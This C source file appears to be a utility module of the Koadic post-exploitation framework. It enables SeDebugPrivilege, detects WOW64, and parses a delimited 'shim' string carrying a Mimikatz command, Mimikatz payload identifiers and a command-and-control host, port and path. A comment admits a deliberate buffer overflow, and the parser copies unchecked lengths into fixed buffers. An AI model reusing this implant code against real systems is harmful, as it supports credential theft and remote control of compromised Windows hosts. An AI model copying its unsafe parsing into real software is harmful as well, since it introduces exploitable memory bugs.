#include "koadic_util.h"
#include <stdlib.h>

BOOL koadic_get_debug_priv()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES priv = { 0 };

	BOOL ret = FALSE;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
		{
			if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL))
				ret = TRUE;
		}

		CloseHandle(hToken);
	}

	return ret;
}

BOOL koadic_cpu_matches_process()
{
	typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
	static LPFN_ISWOW64PROCESS fnIsWow64Process;
	BOOL bIsWow64 = FALSE;

	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

	if (NULL != fnIsWow64Process)
		if (!fnIsWow64Process(GetCurrentProcess(), &bIsWow64))
			return TRUE;

	return !bIsWow64;
}

BOOL koadic_parse_shim_token(char **shim, char **out, char *token)
{
	char *ptr = strstr(*shim, "~~");

	if (!ptr)
		return FALSE;

	memcpy(out, *shim, (ptr - *shim));

	*shim = ptr + strlen(token);

	return TRUE;
}

// we know there's a buffalo overflow in this 
// but we're jus' readin', we ain' writin'
BOOL koadic_parse_shim(LPWSTR buffalo, koadic_shim_parsed *parsed)
{
	char szUrl[MAX_PATH];
	wcstombs(szUrl, buffalo, sizeof(szUrl));

	memset(parsed, 0, sizeof(koadic_shim_parsed));

	char *url = szUrl;


	if (!koadic_parse_shim_token(&url, (char**)&parsed->mimicmd, "~~"))
		return FALSE;

	if (!koadic_parse_shim_token(&url, (char**)&parsed->uuidHeader, "~~"))
		return FALSE; 
	
	if (!koadic_parse_shim_token(&url, (char**)&parsed->uuidShimx64, "~~"))
		return FALSE; 
	
	if (!koadic_parse_shim_token(&url, (char**)&parsed->uuidMimix86, "~~"))
		return FALSE;

	if (!koadic_parse_shim_token(&url, (char**)&parsed->uuidMimix64, "~~"))
		return FALSE;

	int i = 0;

	if (url[4] == 's')
	{
		parsed->secure = TRUE;
		url += 8;
	}
	else
	{
		parsed->secure = FALSE;
		url += 7;
	}

	char *offset = NULL;

	// parse host before :	
	offset = strstr(url, ":");
	memcpy(parsed->host, url, offset - url);

	url = offset + 1;

	// parse port before /
	offset = strstr(url, "/");
	char szPort[10];
	memcpy(szPort, url, offset - url);
	parsed->port = atoi(szPort);

	url = offset;

	// parse path before ?
	//offset = strstr(url, "?");
	//memcpy(parsed->path, url, offset - url);

	url = offset;
	strcpy(parsed->path, offset);

	return TRUE;
}